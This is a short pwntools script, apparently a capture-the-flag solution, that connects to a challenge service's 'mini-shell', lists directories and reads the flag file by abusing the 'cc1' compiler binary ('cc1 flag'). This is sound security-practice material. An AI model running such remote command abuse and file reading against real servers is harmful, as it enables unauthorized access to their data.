'''
unexpected solution: directly execute commands in the remote server
cc1 to output flag directly
'''

from pwn import *


local = 1
url, port = "target_ip", "25307" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

def traverse_bins(directory):
    payload = f'ls -Al {directory}'.encode()
    io.sendline(payload)
    files = io.recvuntil('mini-shell>> ').decode().splitlines()[::-1]
    print('------ all bins exist in ------', directory)
    print(files)

def pwn():
    traverse_bins('/')
    payload = b'cat flag' if local else b'cc1 flag'
    io.sendline(payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
